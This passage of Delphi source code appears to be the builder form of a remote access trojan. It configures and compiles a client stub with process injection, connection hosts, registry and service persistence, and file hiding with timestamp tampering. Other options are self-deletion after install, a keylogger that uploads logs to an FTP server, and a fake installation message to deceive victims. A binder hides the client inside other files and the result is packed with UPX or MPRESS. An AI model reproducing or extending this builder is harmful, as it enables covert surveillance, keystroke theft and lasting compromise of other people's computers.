  TmpItem := lvBinder.Items.Add;
  TmpItem.Caption := dlgOpen1.FileName;
  TmpItem.SubItems.Add(FileSizeToStr(MyGetFileSize(dlgOpen1.FileName)));
  TmpItem.SubItems.Add('Yes');
  TmpItem.ImageIndex := GetImageIndex(TmpItem.Caption);

  FileOptions := TFileOptions.Create;
  FileOptions.Execute := MyStrToBool(TmpItem.SubItems[1]);
  FileOptions.Path := 0;
  TmpItem.Data := TObject(FileOptions);
end;

procedure TFormBuilder.MenuItem1Click(Sender: TObject);
begin
  if not Assigned(lvBinder.Selected) then Exit;
  lvBinder.Selected.Delete;
end;

procedure TFormBuilder.lvBinderSelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
begin
  if not Assigned(lvBinder.Selected) then Exit;
  if lvBinder.Selected.Data <> nil then
  begin
    cbbBinder.ItemIndex := TFileOptions(lvBinder.Selected.Data).Path;
    chkBinder.Checked := TFileOptions(lvBinder.Selected.Data).Execute;
  end;
end;

procedure TFormBuilder.chkBinderClick(Sender: TObject);
begin
  if not Assigned(lvBinder.Selected) then Exit;
  lvBinder.Selected.SubItems[1] := MyBoolToStr(chk1.Checked);
  TFileOptions(lvBinder.Selected.Data).Execute := chk1.Checked;
end;

procedure TFormBuilder.cbbBinderChange(Sender: TObject);
var
  i: Integer;
begin
  if not Assigned(lvBinder.Selected) then Exit;
  TFileOptions(lvBinder.Selected.Data).Path := cbbBinder.ItemIndex;

  if cbbBinder.ItemIndex = 6 then
  begin
    edtBinder.Text := '';
    edtBinder.Visible := True;
  end
  else
  begin
    i := cbbBinder.ItemIndex;
    edtBinder.Text := cbbBinder.Items.Strings[i];
    edtBinder.Visible := False;
  end;
end;

procedure TFormBuilder.ShowConfiguration;
var
  TmpBool: Boolean;
  i: Integer;
begin
  mmo1.Lines.Clear;
  mmo1.Lines.Add(JustL('Profile name', 35) + ProfileName);
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Main settings', 0));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Client identification', 35) + edtId.Text);
  mmo1.Lines.Add(JustL('  Connection password', 35) + edtPassword.Text);
  mmo1.Lines.Add(JustL('  Process injection', 35) + edtProcessname.Text);
  mmo1.Lines.Add(JustL('  Process mutex', 35) + edtMutex.Text);
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Network', 0));

  for i := 0 to lv2.Items.Count - 1 do
  if (lv2.Items.Item[i].Caption <> '') and (lv2.Items.Item[i].SubItems[0] <> '') then
  mmo1.Lines.Add(JustL('  Client host[' + IntToStr(i) + ']', 35) +
    lv2.Items.Item[i].Caption + ':' + lv2.Items.Item[i].SubItems[0]);

  mmo1.Lines.Add(JustL('  Connection delay', 35) + seDelay.Text);
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Installation', 0));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Install client on system', 35) + MyBoolToStr(chkInstall.Checked));
  mmo1.Lines.Add(JustL('  Destination file', 35) + edtDestination.Text);
  mmo1.Lines.Add(JustL('  Folder name', 35) + edtFolder.Text);
  mmo1.Lines.Add(JustL('  Filename', 35) + edtFilename.Text);
  mmo1.Lines.Add(JustL('  Melt file after installation', 35) + MyBoolToStr(chkMelt.Checked));
  mmo1.Lines.Add(JustL('  Change folder and filename time', 35) + MyBoolToStr(chkDate.Checked));
  mmo1.Lines.Add(JustL('  Hide folder and filename', 35) + MyBoolToStr(chkHide.Checked));
  mmo1.Lines.Add(JustL('  Enable keylogger', 35) + MyBoolToStr(chkKeylogger.Checked));
  mmo1.Lines.Add(JustL('  Wait for system reboot', 35) + MyBoolToStr(chkReboot.Checked));
  mmo1.Lines.Add(JustL('  Persistence installation', 35) + MyBoolToStr(chkPersistence.Checked));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Startup', 0));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Registry startup', 35) + MyBoolToStr(chkRegStartup.Checked));
  mmo1.Lines.Add(JustL('  HKCU', 35) + MyBoolToStr(chkHKCU.Checked));
  mmo1.Lines.Add(JustL('  HKLM', 35) + MyBoolToStr(chkHKLM.Checked));
  mmo1.Lines.Add(JustL('  Policies', 35) + MyBoolToStr(chkPolicies.Checked));
  mmo1.Lines.Add(JustL('  Registry key name', 35) + edtKeyname.Text);
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Service startup', 35) + MyBoolToStr(chkServStartup.Checked));
  mmo1.Lines.Add(JustL('  Service name', 35) + edtName.Text);
  mmo1.Lines.Add(JustL('  Service description', 35) + edtDescription.Text);
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Keylogger', 0));
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('  Send keylogs by FTP', 35) + MyBoolToStr(chkFtplogs.Checked));
  mmo1.Lines.Add(JustL('  FTP host', 35) + edtFtphost.Text);
  mmo1.Lines.Add(JustL('  FTP port', 35) + seFtpPort.Text);
  mmo1.Lines.Add(JustL('  FTP uername', 35) + edtFtpUser.Text);
  mmo1.Lines.Add(JustL('  FTP password', 35) + edtFtpPass.Text);
  mmo1.Lines.Add(JustL('  FTP directory', 35) + edtFtpDir.Text);
  mmo1.Lines.Add(JustL('  Send keylogs every', 35) + se1.Text + ' minutes');
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Fake message', 0));
  mmo1.Lines.Add(''); 
  mmo1.Lines.Add(JustL('  Show a fake installation message', 35) +
    MyBoolToStr(chkFakemsg.Checked));
  mmo1.Lines.Add(JustL('  Message title', 35) + edtTitle.Text);
  mmo1.Lines.Add(JustL('  Message text', 35) + redtBody.Text);    
  mmo1.Lines.Add('');
  mmo1.Lines.Add(JustL('Binder', 0));
  mmo1.Lines.Add('');

  if lvBinder.Items.Count = 0 then TmpBool := False else TmpBool := True;

  if TmpBool = True then
  begin
    mmo1.Lines.Add(JustL('  Bind client with files', 35) +
      'Yes (' + IntToStr(lv1.Items.Count) + ')');
  end
  else mmo1.Lines.Add(JustL('  Bind client with files', 35) + 'No');
end;
  
procedure TFormBuilder.ListProfiles;
var
  SchRec: TSearchRec;
  pList: TListItem;
  pPath: string;
begin
  lv1.Clear;
  pPath := ExtractFilePath(ParamStr(0)) + 'Profiles\' + '*.*';
  if FindFirst(pPath, faAnyFile, SchRec) <> 0 then Exit;
  repeat
    if (SchRec.Attr and faDirectory) <> faDirectory then
    begin
      pList := lv1.Items.Add;
      pList.Caption := SchRec.Name;
      pList.ImageIndex := 0;
    end;
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);
end;

procedure TFormBuilder.SaveProfile;
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + '\Profiles\' + ProfileName;
  if not FileExists(TmpStr) then
  begin
    MessageBox(Handle, PChar('Profile "' + TmpStr + '" not found.'),
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    Exit;
  end;

  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteString('Main settings', 'Client id', edtId.Text);
  IniFile.WriteString('Main settings', 'Client password', edtPassword.Text);
  IniFile.WriteInteger('Main settings', 'InjectInto', cbbInjection.ItemIndex);
  IniFile.WriteString('Main settings', 'InjectInto string', edtProcessname.Text);
                                                                        
  IniFile.WriteString('Network', 'Connection host', GrabHostList);
  IniFile.WriteInteger('Network', 'Connection delay', seDelay.Value);
  
  IniFile.WriteBool('Installation', 'Installation', chkInstall.Checked);
  IniFile.WriteInteger('Installation', 'Destination', cbbDestination.ItemIndex);
  IniFile.WriteString('Installation', 'Custom path', edtDestination.Text);
  IniFile.WriteString('Installation', 'Client folder', edtFolder.Text);
  IniFile.WriteString('Installation', 'Client filename', edtFilename.Text);
  IniFile.WriteBool('Installation', 'Melt', chkMelt.Checked);
  IniFile.WriteBool('Installation', 'Hide client', chkHide.Checked);
  IniFile.WriteBool('Installation', 'Offline keylogger', chkKeylogger.Checked);
  IniFile.WriteBool('Installation', 'Reboot', chkReboot.Checked);
  IniFile.WriteBool('Installation', 'Persistence', chkPersistence.Checked);
  IniFile.WriteBool('Installation', 'Change creation date', chkDate.Checked);

  IniFile.WriteBool('Registry startup', 'Registry startup', chkRegStartup.Checked);
  IniFile.WriteBool('Registry startup', 'HKCU', chkHKCU.Checked);
  IniFile.WriteBool('Registry startup', 'HKLM', chkHKLM.Checked);
  IniFile.WriteBool('Registry startup', 'Policies', chkPolicies.Checked);
  IniFile.WriteString('Registry startup', 'Key name', edtKeyname.Text);

  IniFile.WriteBool('Service startup', 'Service startup', chkServStartup.Checked);
  IniFile.WriteString('Service startup', 'Service name', edtName.Text);
  IniFile.WriteString('Service startup', 'Service description', edtDescription.Text);

  IniFile.WriteBool('Fake message', 'Fake message', chkFakemsg.Checked);
  IniFile.WriteString('Fake message', 'Message title', edtTitle.Text);
  IniFile.WriteString('Fake message', 'Message body', redtBody.Text);
  IniFile.WriteInteger('Fake message', 'Message type', rgIcon.ItemIndex);
  IniFile.WriteInteger('Fake message', 'Message buttons', rgButton.ItemIndex);

  IniFile.WriteBool('Send keylogs by ftp', 'Send keylogs by ftp', chkFtplogs.Checked);
  IniFile.WriteString('Send keylogs by ftp', 'Ftp host', edtFtphost.Text);
  IniFile.WriteString('Send keylogs by ftp', 'Ftp user', edtFtpUser.Text);
  IniFile.WriteString('Send keylogs by ftp', 'Ftp pass', edtFtpPass.Text);
  IniFile.WriteString('Send keylogs by ftp', 'Ftp directory', edtFtpDir.Text);
  IniFile.WriteInteger('Send keylogs by ftp', 'Ftp port', seFtpPort.Value);
  IniFile.WriteInteger('Send keylogs by ftp', 'Send keylogs every', se1.Value);

  IniFile.WriteBool('More options', 'Compression', chkCompress.Checked);
  IniFile.WriteInteger('More options', 'Compression type', rgCompression.ItemIndex);

  IniFile.WriteBool('Profile', 'Autosave', chk12.Checked);
  IniFile.Free;
end;
                
function TFormBuilder.WriteSettings: Boolean;
var
  hResource: THandle;
begin
  Result := False;
  hResource := BeginUpdateResource(PChar(ClientFile), False);
  if hResource <> 0 then
  begin
    if UpdateResource(hResource, RT_RCDATA, 'CFG', 0, @ProfileConfig[1], Length(ProfileConfig)) then Result := True;
    EndUpdateResource(hResource, False);  
  end;
end;

procedure BuilderThread(P: Pointer); stdcall;
var
  TmpRes: TResourceStream;
  TmpStr: string;
  TmpBool: Boolean;
  i: Integer;
begin
  with FormBuilder do
  begin                  
    lbl25.Visible := True;
    lbl25.Caption := 'Status: New client building started...';
    btn5.Enabled := False;
    EnableCloseButtton := False;
    Sleep(50);

    MPRESS := TmpDir + 'xMPRESS.exe';
    UPX := TmpDir + 'xUPX.exe';

    TmpRes := TResourceStream.Create(HInstance, 'STUB', 'stubfile');
    TmpRes.SaveToFile(ClientFile);
    TmpRes.Free;
                   
    lbl25.Caption := 'Status: Checking new configuration...';
    Sleep(50);

    ProfileConfig := '';

    for i := 0 to 4 do
    ProfileConfig := ProfileConfig + PClientConfiguration(P)^.Hosts[i] + '#';
    ProfileConfig := ProfileConfig + '|';
    for i := 0 to 4 do
    ProfileConfig := ProfileConfig + IntToStr(PClientConfiguration(P)^.Ports[i]) + '#';
    ProfileConfig := ProfileConfig + '|';
    for i := 0 to 3 do
    ProfileConfig := ProfileConfig + PClientConfiguration(P)^.FTPOptions[i] + '#';
    ProfileConfig := ProfileConfig + '|';
    for i := 0 to 3 do
    ProfileConfig := ProfileConfig + PClientConfiguration(P)^.MessageParams[i] + '#';
    ProfileConfig := ProfileConfig + '|';

    ProfileConfig := ProfileConfig + IntToStr(PClientConfiguration(P)^.StartupOptions) + '|' +
                     IntToStr(PClientConfiguration(P)^.Delay) + '|' +
                     IntToStr(PClientConfiguration(P)^.FTPPort) + '|' +
                     IntToStr(PClientConfiguration(P)^.FTPDelay) + '|' +
                     PClientConfiguration(P)^.ClientId + '|' +
                     PClientConfiguration(P)^.StartupKey + '|' +
                     PClientConfiguration(P)^.Password + '|' +
                     PClientConfiguration(P)^.ServiceDesc + '|' +
                     PClientConfiguration(P)^.MutexName + '|' +
                     PClientConfiguration(P)^.ServiceName + '|' +
                     PClientConfiguration(P)^.Foldername + '|' +
                     PClientConfiguration(P)^.FileName + '|' +
                     PClientConfiguration(P)^.Destination + '|' +
                     PClientConfiguration(P)^.InjectInto + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.FakeMessage) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.Install) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.Keylogger) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.Melt) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.Startup) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.Hide) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.WaitReboot) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.ChangeDate) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.HKCUStartup) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.HKLMStartup) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.PoliciesStartup) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.Persistence) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.FTPLogs) + '|' +
                     MyBoolToStr(PClientConfiguration(P)^.Binded);

    lbl25.Caption := 'Status: Writting new configuration...';
    Sleep(50);

    if WriteSettings = False then
    begin
      MessageBox(Handle, 'Failed to write new configuration.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      lbl25.Caption := 'Status: Failed to write new configuration.';
      Sleep(50);
      btn5.Enabled := True;
      EnableCloseButtton := True;
      Exit;
    end;
    
    lbl25.Caption := 'Status: New configuration written succesfully!';
    Sleep(50);
    lbl25.Caption := 'Status: Checking for binding options...';
    Sleep(50);

    if PClientConfiguration(P)^.Binded = True then
    begin
      TmpBool := True;

      for i := 0 to lvBinder.Items.Count -1 do
      begin
        TmpStr := ExtractFileName(lvBinder.Items.Item[i].Caption);
        TmpBool := WriteResData(ClientFile, @TmpStr[1], Length(TmpStr), 'F' + IntToStr(i));

        TmpStr := IntToStr(TFileOptions(lvBinder.Items.Item[i].Data).Path);
        TmpBool := WriteResData(ClientFile, @TmpStr[1], Length(TmpStr), 'P' + IntToStr(i));

        TmpStr := MyBoolToStr(TFileOptions(lvBinder.Items.Item[i].Data).Execute);
        TmpBool := WriteResData(ClientFile, @TmpStr[1], Length(TmpStr), 'E' + IntToStr(i));

        FileToStr(lvBinder.Items.Item[i].Caption, TmpStr);
        TmpBool := WriteResData(ClientFile, @TmpStr[1], Length(TmpStr), 'D' + IntToStr(i));

        TmpStr := IntToStr(MyGetFileSize(lvBinder.Items.Item[i].Caption));
        TmpBool := WriteResData(ClientFile, @TmpStr[1], Length(TmpStr), 'S' + IntToStr(i));
      end;

      TmpStr := IntToStr(lvBinder.Items.Count);
      TmpBool := WriteResData(ClientFile, @TmpStr[1], Length(TmpStr), 'C');

      if TmpBool = True then
      begin
        lbl25.Caption := 'Status: Files binded successfully!';
        Sleep(50);
      end
      else
      begin
        lbl25.Caption := 'Status: Failed to bind files.';
        Sleep(50);
      end;
    end
    else
    begin
      lbl25.Caption := 'Status: No binding options found.';
      Sleep(50);
    end;

    lbl25.Caption := 'Status: Checking icon path...';
    Sleep(50);

    IconPath := edtIconPath.Text;
    if IconPath <> '' then
    begin
      if not FileExists(IconPath) then
      begin
        lbl25.Caption := 'Status: Icon path not found.';
        Sleep(50);
        lbl25.Caption := 'Status: Failed to update file icon.';
        Sleep(50);
        Exit;
      end;

      lbl25.Caption := 'Status: Icon path found!';
      Sleep(50);
      lbl25.Caption := 'Status: Updating file icon...';
      Sleep(50);

      UpdateExeIcon(PChar(ClientFile), 'MAINICON', PChar(IconPath));
      UpdateExeIcon(PChar(ClientFile), 'ICON_STANDARD', PChar(IconPath));

      if UpdateApplicationIcon(PChar(IconPath), PChar(ClientFile)) = True then
        lbl25.Caption := 'Status: File icon updated succesfully!'
      else lbl25.Caption := 'Status: Failed to update file icon.';

      Sleep(50);
    end
    else
    begin
      lbl25.Caption := 'Status: Icon path not found.';
      Sleep(50);
    end;

    if chkCompress.Checked then
    begin
      case rgCompression.ItemIndex of
        1:  begin
              lbl25.Caption := 'Status: Compressing file with mpress method...';
              Sleep(50);

              TmpRes := TResourceStream.Create(HInstance, 'MPRESS', 'MpressFile');
              TmpRes.SaveToFile(MPRESS);
              TmpRes.Free;

              ShellExecute(Handle, nil, PChar('"' + MPRESS + '"'),
                           PChar('-sq "' + ClientFile + '"'), '', SW_HIDE);

              while FileExists(MPRESS) do
              begin
                DeleteFile(PChar(MPRESS));
                Sleep(10);
              end;

              lbl25.Caption := 'Status: File compressed.';
              Sleep(50);
            end;
        0:  begin
              lbl25.Caption := 'Status: Compressing file with upx method...';
              Sleep(50);

              TmpRes := TResourceStream.Create(HInstance, 'UPX', 'upxfile');
              TmpRes.SaveToFile(UPX);
              TmpRes.Free;

              ShellExecute(Handle, nil, PChar('"' + UPX + '"'),
                           PChar('"' + ClientFile + '"'), '', SW_HIDE);

              while FileExists(UPX) do
              begin
                DeleteFile(PChar(UPX));
                Sleep(10);
              end;

              lbl25.Caption := 'Status: File compressed.';
              Sleep(50);
            end;
      end;
    end
    else
    begin
      lbl25.Caption := 'Status: Skipping file compression...';
      Sleep(50);
    end;

    lbl25.Caption := 'Status: Done!';
    Sleep(50);
    lbl25.Caption := 'Status: Idle';
    btn5.Enabled := True;
    EnableCloseButtton := True;
    lbl25.Visible := False;

    MessageBox(Handle, 'Client built succesfully!',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONINFORMATION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);

    if chk12.Checked then SaveProfile;
    Close;
  end;
end;
               
function RandomId: string;
const
  TmpStr = '0123456789ABCDEFGHJKLMNPQRSTUVWXYZ';
var
  i: Integer;
  TmpStr1: string;
begin
  TmpStr1 := '';
  Randomize;
  for i := 0 to 6 do TmpStr1 := TmpStr1 + TmpStr[Random(Length(TmpStr)) + 1];
  Result := TmpStr1;
end;

procedure TFormBuilder.btn5Click(Sender: TObject);
var
  TmpHandle: THandle;
  i: Integer;
begin
  if edtId.Text <> '' then ClientConfiguration.ClientId := edtId.Text + '_' + RandomId else
  begin
    MessageBox(Handle, 'Invalid client id.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    pnlMain.BringToFront;
    edtId.SetFocus;
    Exit;
  end;

  ClientConfiguration.Password := edtPassword.Text;
  ClientConfiguration.Delay := StrToInt(se1.Text);

  if edtProcessname.Text <> '' then ClientConfiguration.InjectInto := edtProcessname.Text else
  begin
    MessageBox(Handle, 'Invalid process name.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    pnlMain.BringToFront;
    edtProcessname.SetFocus;
    Exit;
  end;

  if edtMutex.Text <> 'PRMUTEX_' then ClientConfiguration.MutexName := edtMutex.Text else
  begin
    MessageBox(Handle, 'Invalid mutex name.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    pnlMain.BringToFront;
    edtMutex.SetFocus;
    Exit;
  end;

  if lv2.Items.Count > 0 then
  begin
    ClientConfiguration.Hosts[0] := lv2.Items[0].Caption;
    ClientConfiguration.Ports[0] := StrToInt(lv2.Items[0].SubItems[0]);

    for i := 1 to lv2.Items.Count - 1 do
    begin
      ClientConfiguration.Hosts[i] := lv2.Items[i].Caption;
      if lv2.Items[i].SubItems[0] = '' then
        ClientConfiguration.Ports[i] := 0
      else ClientConfiguration.Ports[i] := StrToInt(lv2.Items[i].SubItems[0]);
    end;
  end
  else
  begin
    MessageBox(Handle, 'Invalid host and port.',
              PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
              MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    pnlNetwork.BringToFront;
    lv2.SetFocus;
    Exit;
  end;

  ClientConfiguration.Install := chkInstall.Checked;

  if ClientConfiguration.Install then
  begin
    if edtDestination.Text <> '' then ClientConfiguration.Destination := edtDestination.Text else
    begin
      MessageBox(Handle, 'Invalid destination path.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlInstallation.BringToFront;
      edtDestination.SetFocus;
      Exit;
    end;

    if edtFolder.Text <> '' then ClientConfiguration.Foldername := edtFolder.Text else
    begin
      MessageBox(Handle, 'Invalid foldername.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlInstallation.BringToFront;
      edtFolder.SetFocus;
      Exit;
    end;

    if edtFilename.Text <> '' then ClientConfiguration.FileName := edtFilename.Text + '.exe' else
    begin
      MessageBox(Handle, 'Invalid filename.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlInstallation.BringToFront;
      edtFilename.SetFocus;
      Exit;
    end;

    ClientConfiguration.Melt := chkMelt.Checked;
    ClientConfiguration.ChangeDate := chkDate.Checked;
    ClientConfiguration.Hide := chkHide.Checked;
    ClientConfiguration.Keylogger := chkKeylogger.Checked;
    ClientConfiguration.WaitReboot := chkReboot.Checked;
    ClientConfiguration.Persistence := chkPersistence.Checked;
  end;

  if (chkRegStartup.Checked) or (chkServStartup.Checked) then
    ClientConfiguration.Startup := True
  else ClientConfiguration.Startup := False;

  if chkRegStartup.Checked = True then ClientConfiguration.StartupOptions := 0 else
  if chkServStartup.Checked = True then ClientConfiguration.StartupOptions := 1;

  if ClientConfiguration.StartupOptions = 0 then
  begin
    ClientConfiguration.HKCUStartup := chkHKCU.Checked;
    ClientConfiguration.HKLMStartup := chkHKLM.Checked;
    ClientConfiguration.PoliciesStartup := chkPolicies.Checked;

    if edtKeyname.Text <> '' then ClientConfiguration.StartupKey := edtKeyname.Text else
    begin
      MessageBox(Handle, 'Invalid startup key name.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlStartup.BringToFront;
      edtKeyname.SetFocus;
      Exit;
    end;
  end
  else
  begin
    if edtName.Text <> '' then ClientConfiguration.ServiceName := edtName.Text else
    begin
      MessageBox(Handle, 'Invalid startup service name.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlStartup.BringToFront;
      edtName.SetFocus;
      Exit;
    end;

    if edtDescription.Text <> '' then ClientConfiguration.ServiceDesc := edtDescription.Text else
    begin
      MessageBox(Handle, 'Invalid startup description text.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlStartup.BringToFront;
      edtDescription.SetFocus;
      Exit;
    end;
  end;
  
  ClientConfiguration.FakeMessage := chkFakemsg.Checked;

  if ClientConfiguration.FakeMessage then
  begin
    if edtTitle.Text <> '' then ClientConfiguration.MessageParams[0] := edtTitle.Text else
    begin
      MessageBox(Handle, 'Invalid message title.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlMessage.BringToFront;
      edtTitle.SetFocus;
      Exit;
    end;

    if redtBody.Text <> '' then ClientConfiguration.MessageParams[1] := redtBody.Text else
    begin
      MessageBox(Handle, 'Invalid message text.',
                PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlMessage.BringToFront;
      redtBody.SetFocus;
      Exit;
    end;

    ClientConfiguration.MessageParams[2] := IntToStr(rgIcon.ItemIndex);
    ClientConfiguration.MessageParams[3] := IntToStr(rgButton.ItemIndex);
  end;

  ClientConfiguration.FTPLogs := chkFtplogs.Checked;

  if ClientConfiguration.FTPLogs = True then
  begin
    if (edtFtphost.Text = '') or (edtFtpUser.Text = '') or (edtFtpPass.Text = '') or
      (edtFtpDir.Text = '')
    then
    begin
      MessageBox(Handle, 'One or more entry are empty.',
                 PChar(PROGRAMNAME + ' ' + PROGRAMVERSION),
                 MB_OK or MB_ICONERROR or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
      pnlKeylogger.BringToFront;
      Exit;
    end;

    ClientConfiguration.FTPOptions[0] := edtFtphost.Text;
    ClientConfiguration.FTPOptions[1] := edtFtpUser.Text;
    ClientConfiguration.FTPOptions[2] := edtFtpDir.Text;
    ClientConfiguration.FTPOptions[3] := edtFtpPass.Text;
    ClientConfiguration.FTPPort := seFtpPort.Value;
    ClientConfiguration.FTPDelay := se1.Value;
  end;

  if lvBinder.Items.Count > 0 then ClientConfiguration.Binded := True else
  if lvBinder.Items.Count = 0 then ClientConfiguration.Binded := False;

  dlgSave1.Title := PROGRAMNAME + ' ' + PROGRAMVERSION;
  dlgSave1.InitialDir := ExtractFilePath(ParamStr(0));
  dlgSave1.Filter := '(*.exe)|*.exe';
  dlgSave1.DefaultExt := 'exe';
  dlgSave1.FileName := ExtractFilePath(ParamStr(0)) + 'Client.exe';
  if not dlgSave1.Execute then Exit;
  ClientFile := dlgSave1.FileName;
  CreateThread(nil, 0, @BuilderThread, @ClientConfiguration, 0, TmpHandle);
end;

procedure TFormBuilder.FormClose(Sender: TObject;
  var Action: TCloseAction);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  IniFile.WriteInteger('Builder', 'Left', Left);
  IniFile.WriteInteger('Builder', 'Top', Top);
  IniFile.Free;
end;

procedure TFormBuilder.FormCloseQuery(Sender: TObject;
  var CanClose: Boolean);
begin
  CanClose := EnableCloseButtton;
end;

procedure TFormBuilder.FormCreate(Sender: TObject);
var
  TmpStr: string;
  IniFile: TIniFile;
begin
  TmpStr := ExtractFilePath(ParamStr(0)) + 'Settings.ini';
  IniFile := TIniFile.Create(TmpStr);
  Left := IniFile.ReadInteger('Builder', 'Left', 302);
  Top := IniFile.ReadInteger('Builder', 'Top', 62);
  IniFile.Free;
end;

procedure TFormBuilder.FormShow(Sender: TObject);
begin
  ListProfiles;
  pnlMain.BringToFront;
  btn5.Visible := False;
  EnableCloseButtton := True;
  lvBinder.SmallImages := FormMain.ImagesList;
end;

end.
